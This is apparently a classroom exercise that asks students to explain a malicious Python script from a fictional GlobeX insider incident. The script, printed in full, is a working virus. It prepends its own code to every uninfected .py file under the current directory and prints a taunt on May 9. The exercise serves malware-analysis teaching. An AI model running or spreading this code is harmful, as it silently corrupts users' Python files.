Overview
The ability to read code written by others is a valuable skill to carry into your new career. Today you will analyze a malicious script written in Python and submit an interpreted version of the file with comments.

Scenario
Last week, a GlobeX engineer was terminated from the organization under unpleasant circumstances. This morning, your service desk team responded to a ticket from the engineering department that their Python script repository had been tampered with, with the words “You have been hacked” written and saved into the scripts themselves. The service desk team also noted that the system clocks had been tampered with on various engineering computers an incorrectly set to May 9. After a careful review of system logs you find that the below script was executed with administrator privilege on various engineering systems.

The GlobeX board of directors has asked you to analyze the contents of this script and explain in plain terms what the script does.

Objectives
Copy the below Python script to your public GitHub repo. Do not execute this script in your Ubuntu VM used for class. If you wish to execute this script, either backup your VM using VirtualBox Snapshot or create a separate VM for testing.

#!/usr/bin/python3
import os
import datetime

# Name the signature that says a file is infected
SIGNATURE = "VIRUS"

# This is an function to locate python files and identify those not infected
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # Check for .py extension
        elif fname[-3:] == ".py":
            infected = False
            # Check if  virus signature is in file
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If not infected add it to the list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function infect files found with the virus
def infect(files_targeted):
    # Open  virus script and read the first 39 lines
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # go through targeted files read info and overrite with virus + original content
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

# Function check if its time to execute 
def detonate():
    # Check if the date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# finds files infect them and check detonation
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
